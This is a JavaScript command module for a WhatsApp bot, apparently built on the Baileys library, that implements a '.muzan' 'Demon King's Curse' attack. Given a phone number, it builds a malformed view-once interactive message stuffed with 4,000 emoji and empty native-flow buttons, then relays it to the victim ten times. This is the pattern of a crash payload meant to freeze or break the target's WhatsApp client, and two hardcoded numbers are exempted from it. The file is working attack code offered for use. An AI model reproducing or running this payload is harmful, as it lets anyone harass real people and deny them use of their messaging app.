// commands/muzan.js
const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function muzanCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "🩸 *Muzan Kibutsuji*\n\nUsage: .muzan <number>\nExample: .muzan 628123456789\n\n*Demon King's Curse*"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Sun Breathing*" }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `🩸 *Demon King's Curse* spreading to ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "🩸", key: message.key } });

    try {
        const cursePayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: 999
                        },
                        body: { text: "✦ Ṁüżȧṅ Ḳīḅüƭṡüĵī ✦" + "🩸".repeat(4000) },
                        footer: { text: "Twelve Kizuki" },
                        nativeFlowMessage: {
                            buttons: [
                                { name: "single_select", buttonParamsJson: "" },
                                { name: "call_permission_request", buttonParamsJson: "" },
                                { name: "payment_method", buttonParamsJson: "" },
                                { name: "mpm", buttonParamsJson: "" }
                            ]
                        }
                    }
                }
            }
        };

        for (let i = 0; i < 10; i++) {
            await sock.relayMessage(target, cursePayload, { participant: { jid: target } });
        }
        
        await sock.sendMessage(chatId, { text: `✅ *Demon King's Curse* consumed ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "🦇", key: message.key } });

    } catch (error) {
        console.error('[Muzan]', error.message);
        await sock.sendMessage(chatId, { text: `❌ *Curse failed:* ${error.message}` }, { quoted: message });
    }
}

module.exports = muzanCommand;